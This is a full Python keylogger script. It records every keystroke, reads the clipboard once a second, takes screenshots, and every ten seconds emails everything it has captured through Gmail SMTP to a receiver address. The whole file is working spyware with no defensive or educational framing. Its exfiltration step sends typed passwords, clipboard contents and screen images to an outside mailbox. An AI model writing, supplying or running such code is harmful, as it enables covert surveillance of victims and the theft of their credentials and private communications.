from pynput import keyboard
import smtplib
import threading
import pyperclip
import pyautogui
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from io import BytesIO
import time

text = ""
shift_pressed = False
clipboard_content = ""

sender_email = "your@gmail.com"
sender_password = "app Password"  # Consider using an App Password if needed
receiver_email = "receiver@gmail.com"

time_interval = 10

def send_email():
    global text, clipboard_content  
    try:
        
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = receiver_email
        message['Subject'] = 'Keystroke Data'
        
        
        email_body = f"Keystrokes:\n{text}\n\nClipboard Content:\n{clipboard_content}"
        message.attach(MIMEText(email_body, 'plain'))
        
        
        screenshot = pyautogui.screenshot()
        screenshot_io = BytesIO()
        screenshot.save(screenshot_io, format='PNG')
        screenshot_io.seek(0)
        
        
        image = MIMEImage(screenshot_io.read(), name='screenshot.png')
        message.attach(image)
        
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  
        server.login(sender_email, sender_password) 
        
        
        server.send_message(message)
        server.quit()
        
        
        text = ""
        clipboard_content = ""
        
        
        global email_timer
        email_timer = threading.Timer(time_interval, send_email)
        email_timer.start()
    
    except Exception as e:
        print(f"Failed to send email: {e}")

def on_press(key):
    global text, shift_pressed  
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = True
    elif key == keyboard.Key.esc:
        return False
    else:
        if shift_pressed:
            special_chars = {
                '1': '!',
                '2': '@',
                '3': '#',
                '4': '$',
                '5': '%',
                '6': '^',
                '7': '&',
                '8': '*',
                '9': '(',
                '0': ')',
                '-': '_',
                '=': '+',
                '[': '{',
                ']': '}',
                '\\': '|',
                ';': ':',
                '\'': '"',
                ',': '<',
                '.': '>',
                '/': '?'
            }
            key_str = str(key).strip("'")
            if key_str in special_chars:
                text += special_chars[key_str]
            else:
                text += key_str
            shift_pressed = False
        else:
            text += str(key).strip("'")

def monitor_clipboard():
    global clipboard_content
    try:
        while True:
            clipboard_content = pyperclip.paste()
            time.sleep(1) 
    except Exception as e:
        print(f"Clipboard monitoring failed: {e}")

clipboard_thread = threading.Thread(target=monitor_clipboard)
clipboard_thread.daemon = True
clipboard_thread.start()

email_timer = threading.Timer(time_interval, send_email)
email_timer.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
